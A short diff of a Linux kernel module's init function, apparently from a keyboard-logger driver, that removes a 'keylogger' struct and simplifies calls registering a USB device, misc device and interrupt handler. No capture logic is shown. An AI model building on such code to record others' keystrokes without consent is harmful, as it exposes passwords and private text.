@@ -21,12 +21,6 @@ int init_module(void)
 	// 	.list = NULL
 	// };
 	// LIST_HEAD(&keylogger);
-	struct list_head  keylogger_list;
-	struct test keylogger = {
-		.gay = 1,
-		.list = keylogger_list
-	};
-	INIT_LIST_HEAD(&keylogger_list);
 
 	int result = ft_register_usb();
 	if (result)
@@ -34,13 +28,13 @@ int init_module(void)
 	else
 		ft_log("USB Registration OK");
 
-	result = ft_create_misc_device(&keylogger);
+	result = ft_create_misc_device();
 	if (result)
 		ft_warn("MiscDev Registration failed");
 	else
 		ft_log("MiscDev Registration OK");
 
-	result = ft_register_interrupt(&keylogger);
+	result = ft_register_interrupt();
 	if (result)
 		ft_warn("IRQ Registration failed");
 	else
